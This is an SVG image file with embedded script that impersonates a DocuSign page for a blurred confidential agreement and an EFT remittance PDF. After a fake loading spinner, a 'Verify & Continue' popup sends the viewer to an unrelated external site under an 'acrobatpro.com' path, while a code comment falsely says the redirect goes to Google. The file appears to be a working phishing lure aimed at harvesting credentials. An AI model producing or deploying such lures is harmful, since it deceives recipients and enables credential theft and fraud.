<svg width="800" height="600" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <defs>
    <style>
      .hidden {
        display: none;
      }

      .blur-effect {
        filter: url(#documentBlur);
      }

      .verify-btn {
        cursor: pointer;
        transition: all 0.3s ease;
      }

      .verify-btn:hover rect {
        fill: #E6A300;
      }

      @keyframes fadeIn {
        from { opacity: 0; transform: scale(0.9); }
        to { opacity: 1; transform: scale(1); }
      }

      .popup-container {
        animation: fadeIn 0.4s ease;
      }
    </style>

    <linearGradient id="bg" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" style="stop-color:#f5f7fa;stop-opacity:1" />
      <stop offset="100%" style="stop-color:#e4e8f0;stop-opacity:1" />
    </linearGradient>

    <linearGradient id="headerBg" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" style="stop-color:#265cb3;stop-opacity:1" />
      <stop offset="100%" style="stop-color:#265cb3;stop-opacity:1" />
    </linearGradient>

    <linearGradient id="popupBg" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" style="stop-color:#2563c6;stop-opacity:1" />
      <stop offset="100%" style="stop-color:#3b6bc0;stop-opacity:1" />
    </linearGradient>

    <filter id="shadow" x="-20%" y="-20%" width="140%" height="140%">
      <feDropShadow dx="2" dy="4" stdDeviation="8" flood-color="#000000" flood-opacity="0.2"/>
    </filter>

    <filter id="documentBlur">
      <feGaussianBlur in="SourceGraphic" stdDeviation="8" />
    </filter>
  </defs>

  <!-- Background -->
  <rect width="100%" height="100%" fill="url(#bg)"/>

  <!-- Main Document Container (Will remain blurred) -->
  <g id="documentContainer" class="blur-effect">
    <g filter="url(#shadow)" transform="translate(100, 50)">
      <rect x="0" y="0" width="600" height="500" rx="12" fill="white"/>

      <!-- Header -->
      <rect x="0" y="0" width="600" height="60" fill="url(#headerBg)"/>

      <!-- Docusign Logo -->
      <g transform="translate(20, 10)">
        <rect x="0" y="0" width="40" height="40" rx="8" fill="white"/>
        <rect x="8" y="8" width="24" height="24" fill="#2c5aa0"/>
        <rect x="12" y="12" width="16" height="2" fill="white"/>
        <rect x="12" y="16" width="16" height="2" fill="white"/>
        <rect x="12" y="20" width="8" height="2" fill="white"/>
      </g>

      <text x="70" y="30" font-family="Arial" font-size="20" font-weight="bold" fill="white">DocuSign</text>

      <!-- Content Area -->
      <g transform="translate(40, 100)">
        <!-- Document Title -->
        <text x="0" y="0" font-family="Arial" font-size="22" font-weight="bold" fill="#333">Confidential Business Agreement</text>

        <!-- Document Info -->
        <text x="0" y="30" font-family="Arial" font-size="14" fill="#666">Document ID: DS-2023-7892 | Created: October 15, 2023</text>

        <!-- Document Preview Box -->
        <rect x="0" y="60" width="520" height="280" rx="8" fill="#f8f9fa" stroke="#ccc" stroke-dasharray="4,4"/>

        <!-- Document Content Lines -->
        <g transform="translate(20, 80)">
          <line x1="0" y1="20" x2="480" y2="20" stroke="#d0d0d0" stroke-width="2"/>
          <line x1="0" y1="40" x2="460" y2="40" stroke="#d0d0d0" stroke-width="2"/>
          <line x1="0" y1="60" x2="480" y2="60" stroke="#d0d0d0" stroke-width="2"/>
          <line x1="0" y1="80" x2="440" y2="80" stroke="#d0d0d0" stroke-width="2"/>
          <line x1="0" y1="100" x2="480" y2="100" stroke="#d0d0d0" stroke-width="2"/>
          <line x1="0" y1="120" x2="470" y2="120" stroke="#d0d0d0" stroke-width="2"/>
          <line x1="0" y1="140" x2="450" y2="140" stroke="#d0d0d0" stroke-width="2"/>
          <line x1="0" y1="160" x2="480" y2="160" stroke="#d0d0d0" stroke-width="2"/>
          <line x1="0" y1="180" x2="430" y2="180" stroke="#d0d0d0" stroke-width="2"/>
          <line x1="0" y1="200" x2="480" y2="200" stroke="#d0d0d0" stroke-width="2"/>
          <line x1="0" y1="220" x2="460" y2="220" stroke="#d0d0d0" stroke-width="2"/>
        </g>

        <!-- Verification Section -->
        <g transform="translate(0, 360)">
          <rect x="0" y="0" width="520" height="80" rx="8" fill="#f0f7ff" stroke="#2c5aa0" stroke-width="2"/>
          <rect x="0" y="0" width="4" height="80" fill="#2c5aa0"/>

          <!-- Verification text -->
          <text x="20" y="25" font-family="Arial" font-size="14" fill="#333">Please verify to access confidential document</text>

          <!-- Verification icon -->
          <g transform="translate(20, 45)">
            <!-- Lock icon -->
            <rect x="0" y="0" width="16" height="12" rx="2" fill="#2c5aa0"/>
            <rect x="4" y="-4" width="8" height="4" rx="1" fill="#2c5aa0"/>

            <!-- Text -->
            <text x="25" y="6" font-family="Arial" font-size="12" fill="#2c5aa0">Identity verification required</text>
          </g>
        </g>
      </g>
    </g>
  </g>

  <!-- Loading Spinner (Shown during first 2 seconds) -->
  <g id="loadingSpinner">
    <g transform="translate(400, 300)">
      <!-- Spinning circle -->
      <circle cx="0" cy="0" r="30" fill="none" stroke="#e0e0e0" stroke-width="6"/>
      <path d="M0,-30 A30,30 0 0,1 30,0" fill="none" stroke="#2c5aa0" stroke-width="6" stroke-linecap="round">
        <animateTransform attributeName="transform" type="rotate" from="0 0 0" to="360 0 0" dur="1.5s" repeatCount="indefinite"/>
      </path>

      <!-- Loading text -->
      <text x="0" y="60" text-anchor="middle" font-family="Arial" font-size="18" font-weight="600" fill="#2c5aa0">Loading document...</text>
    </g>
  </g>

  <!-- Verification Popup (Hidden initially, shown after 2 seconds) -->
  <g id="verificationPopup" class="hidden">
    <!-- Semi-transparent overlay -->
    <rect x="0" y="0" width="800" height="600" fill="rgba(0, 0, 0, 0.6)"/>

    <!-- Popup Card with Dark Blue Background -->
    <g class="popup-container" transform="translate(200, 200)">
      <rect x="0" y="0" width="400" height="200" rx="16" fill="url(#popupBg)" filter="url(#shadow)"/>

      <!-- Security Icon -->
      <g transform="translate(170, 30)">
        <circle cx="30" cy="30" r="28" fill="#FFD700" stroke="#CCA300" stroke-width="3"/>
        <g transform="translate(18, 18)">
          <!-- Lock body -->
          <rect x="8" y="10" width="8" height="10" fill="none" stroke="#1e3d6f" stroke-width="2.5" rx="1"/>
          <!-- Lock shackle -->
          <path d="M 9 10 L 9 7 C 9 4.8 10.8 3 13 3 C 15.2 3 17 4.8 17 7 L 17 10" fill="none" stroke="#1e3d6f" stroke-width="2.5" stroke-linecap="round"/>
          <!-- Keyhole -->
          <circle cx="12" cy="15" r="1.5" fill="#1e3d6f"/>
        </g>
      </g>

      <!-- Popup Title - White text on dark blue -->
      <text x="200" y="100" text-anchor="middle" font-family="Arial" font-size="18" font-weight="bold" fill="white">
        Confidential Document Access
      </text>

      <!-- Subtitle - Light gray text on dark blue -->
      <text x="200" y="125" text-anchor="middle" font-family="Arial" font-size="14" fill="#c5d0da">
	eft Remittance#52118.pdf
      </text>

      <!-- Verification Button - Dark Yellow with Black Text -->
      <g class="verify-btn" id="verifyButton" transform="translate(125, 145)">
        <rect x="0" y="0" width="150" height="40" rx="8" fill="#CCA300"/>
        <text x="75" y="25" text-anchor="middle" font-family="Arial" font-size="15" font-weight="bold" fill="#000000" style="pointer-events: none;">
          Verify &amp; Continue
        </text>
      </g>
    </g>
  </g>

  <script type="text/javascript">
    <![CDATA[
    (function() {
      // Get elements
      const documentContainer = document.getElementById('documentContainer');
      const loadingSpinner = document.getElementById('loadingSpinner');
      const verificationPopup = document.getElementById('verificationPopup');
      const verifyButton = document.getElementById('verifyButton');

      // Document starts blurred with loading spinner

      // After 2 seconds: hide loading spinner, show verification popup
      // Document STAYS BLURRED
      setTimeout(function() {
        // Hide loading spinner
        loadingSpinner.classList.add('hidden');

        // Show verification popup (document stays blurred)
        verificationPopup.classList.remove('hidden');
      }, 2000);

      // Verify button click handler - redirect to Google
      verifyButton.addEventListener('click', function() {
        window.location.href = 'https://www.marrabu.com/acrobatpro.com/index.html';
      });

      // Hover effects for verify button
      verifyButton.addEventListener('mouseenter', function() {
        const rect = this.querySelector('rect');
        rect.setAttribute('fill', '#E6A300');
      });

      verifyButton.addEventListener('mouseleave', function() {
        const rect = this.querySelector('rect');
        rect.setAttribute('fill', '#CCA300');
      });
    })();
    ]]>
  </script>
</svg>
